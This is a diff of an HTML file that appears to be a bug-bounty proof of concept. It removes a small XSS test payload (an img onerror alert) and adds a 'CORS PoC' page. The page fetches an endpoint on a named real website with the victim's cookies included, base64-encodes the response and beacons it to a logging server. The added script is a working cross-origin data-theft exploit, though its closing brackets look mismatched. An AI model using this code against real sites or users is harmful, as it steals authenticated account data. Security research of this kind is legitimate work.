@@ -1,8 +1,20 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    Web Cache Poiss
-  </head>
-  <body>
-    <img src=x onerror=alert('WebCachePoisioning')>
-  </body>
+<body>
+<h1>CORS PoC</h1>
+<pre id="out"></pre>
+<script>
+  fetch('https://go.stripchat.com/r?action=add&historyIds=209044539&isLogged=true&memberId&noc&guestId=d43085d6a44b50aadb1900b45f3ef7cce5944c34ccc888dba4e8f4ec7a7231dc&domain=admin.stripchat.com', {
+    credentials: 'include'           // send the victim's cookies
+  })
+  .then(r => r.text())
+  .then(data => {
+  // base64 so newlines/special chars survive the URL
+  const blob = btoa(unescape(encodeURIComponent(data)));
+  new Image().src = 'http://127.0.0.1:8000/log?d=' + encodeURIComponent(blob);
+    });
+  })
+  .catch(e => document.getElementById('out').textContent = 'blocked: ' + e);
+</script>
+</body>
 </html>
